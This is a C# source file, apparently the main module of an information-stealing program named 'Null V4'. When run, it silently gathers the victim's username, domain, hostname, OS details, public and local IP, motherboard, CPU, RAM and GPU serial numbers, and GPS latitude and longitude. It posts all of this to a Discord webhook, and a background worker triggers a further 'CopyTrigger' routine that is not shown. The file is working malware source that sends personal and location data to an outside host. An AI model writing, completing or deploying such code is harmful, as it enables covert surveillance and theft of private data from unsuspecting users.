using System;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;
using System.Device.Location;

namespace Null_v4
{
    public class Code
    {
        //Timer
        private static protected bool Start_Timer = false;
        private static protected float Main_Timr = 0;

        //Grab
        private static protected string Grab_Username = Environment.UserName;
        private static protected string Grab_DomainName = Environment.UserDomainName;
        private static protected string Grab_Hostname = System.Net.Dns.GetHostName();
        private static protected string Grab_WindowsVersion = Environment.OSVersion.ToString();
        private static protected string Grab_64Bit = Environment.Is64BitOperatingSystem.ToString();
        private static protected string Grab_CurrentDirectory = Environment.CurrentDirectory.ToString();
        private static protected string Grab_PublicIP = new System.Net.WebClient().DownloadString("https://api.ipify.org");

        //Geo
        private static GeoCoordinateWatcher watcher = new GeoCoordinateWatcher();
        private static GeoCoordinate coord = watcher.Position.Location;


        static void Main()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Working ....");

            if (watcher.TryStart(true, TimeSpan.FromMilliseconds(1000)) == true)
            {
                Debug.WriteLine("Locator Started");
            }
            else
            {
                Debug.WriteLine("Locator Didnt Start");
            }

            Thread t = new Thread(Worker);
            t.Start();

            var task = Task.Run((Func<Task>)SendUserInfo);
            task.Wait();
        }

        static async Task SendUserInfo()
        {
            try
            {
                UploadManager.SendDiscordWebhook(
                "Null V4",
                ":bust_in_silhouette: __**User**__" +
                "\n" + "\n" +
                "\n Username: " + Grab_Username +
                "\n Domain: " + Grab_DomainName +
                "\n Hostname: " + Grab_Hostname +
                "\n Windows Version: " + Grab_WindowsVersion +
                "\n Is 64bit ? = " + Grab_64Bit +
                "\n Working Directory= " + Grab_CurrentDirectory +
                "\n \n" +
                "\n :gear: __**Hardware Info**__ \n \n" +
                "\n **MOTHERBOARD** \n \n" +
                "\n Motherboard Availibilty:" + "\u1cbc" + MotherboardInfo.Availability +
                "\n Motherboard Manu. Key:" + "\u1cbc" + MotherboardInfo.Manufacturer +
                "\n Product ID:" + "\u1cbc" + MotherboardInfo.Product +
                "\n Primary Bus Type:" + "\u1cbc" + MotherboardInfo.PrimaryBusType +
                "\n Secondary Bus Type:" + "\u1cbc" + MotherboardInfo.SecondaryBusType +
                "\n Serial Number:" + "\u1cbc" + MotherboardInfo.SerialNumber +
                "\n Status:" + "\u1cbc" + MotherboardInfo.Status +
                "\n SystemName:" + "\u1cbc" + MotherboardInfo.SystemName +
                "\n Replaceable:" + "\u1cbc" + MotherboardInfo.Replaceable +
                "\n Version:" + "\u1cbc" + MotherboardInfo.Version + "\n" +
                "\n **Server Info** \n" +
                "\n Is Host:" + "\u1cbc" + MotherboardInfo.HostingBoard +
                "\n Removable:" + "\u1cbc" + MotherboardInfo.Removable +
                "\n \n \n \n" +
                  "\n **CPU**" +
                "\n \n" +
                "\n Name:" + "\u1cbc" + CpuInfo.CPUName +
                "\n Serial Number:" + "\u1cbc" + CpuInfo.CPUSN +
                "\n Part Number:" + "\u1cbc" + CpuInfo.CPUPartNumber +
                "\n ID:" + "\u1cbc" + CpuInfo.CPUID +
                "\n Cores:" + "\u1cbc" + CpuInfo.CPUCores +
                "\n Logical Core:" + "\u1cbc" + CpuInfo.CPULogicalProcessors +
                "\n Thread Count:" + "\u1cbc" + CpuInfo.CPUThreads +
                "\n \n" + 
                "\n **RAM**" +
                "\n \n" +
                "\n Part Number:" + "\u1cbc" + RamInfo.RAMPartNumber +
                "\n Serial:" + "\u1cbc" + RamInfo.RAMSerialNumber +
                "\n Speed:" + "\u1cbc" + RamInfo.RAMSpeed + "Mhz" +
                "\n Form Factor:" + "\u1cbc" + RamInfo.RAMFormFactor +
                "\n Max Voltage:" + "\u1cbc" + RamInfo.RAMMaxVoltage +
                "\n \n" +
                "\n **GPU**" +
                "\n \n" +
                "\n Name:" + "\u1cbc" + GPUInfo.GPUDescription +
                "\n Adapter RAM:" + "\u1cbc" + GPUInfo.GPUAdapterRAM + "\u1cbc" + "Bytes" +
                "\n Driver Version:" + "\u1cbc" + GPUInfo.GPUDriverVersion +
                "\n \n" +
                "\n :satellite:  __**IP**__" +
                "\n" + 
                "\n Public IP:" + "\u1cbc" + Grab_PublicIP +
                "\n Local IP:" + "\u1cbc" + IPInfo.GetLocalIPAddress +
                "\n \n" +
                "\n :earth_americas: __**Location**__ \n" +
                "\n Latitude:" + "\u1cbc" + coord.Latitude +
                "\n Longitude:" + "\u1cbc"  + coord.Longitude,

                "8464385"
                );
            }
            catch ( Exception ex )
            {
                Debug.WriteLine( ex.Message );
            }
        }


        static void Worker()
        {
            DataManager.CopyTrigger();
        }
    }
}
